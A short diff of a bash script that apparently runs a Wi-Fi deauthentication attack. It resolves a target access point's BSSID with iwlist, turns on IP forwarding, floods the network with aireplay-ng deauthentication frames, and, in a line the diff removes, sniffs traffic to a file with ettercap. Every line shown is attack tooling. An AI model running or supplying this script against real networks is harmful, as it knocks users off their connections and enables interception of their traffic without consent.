@@ -16,7 +16,7 @@ finalESSID=${var%\"}
 break
 done
 
-BSSID=$(iwlist ${deauthInterface} scan | grep -B 5 $finalESSID | grep Address)
+BSSID=$(iwlist ${deauthInterface} scan | grep -B 5 $finalESSID | grep Address| head -1 )
 finalBSSID=$(echo $BSSID | grep "([A-F0-9][A-F0-9]:){5}[A-F0-9][A-F0-9]" -Eo)
 
 sudo sysctl -w net.ipv4.ip_forward=1
@@ -48,4 +48,3 @@ sudo aireplay-ng -0 50 -a ${finalBSSID} ${deauthInterface} -D
 sleep 20
 sudo airmon-ng stop ${deauthInterface}
 
-sudo ettercap -i ${listeningInterface} -T -w sniff.txt
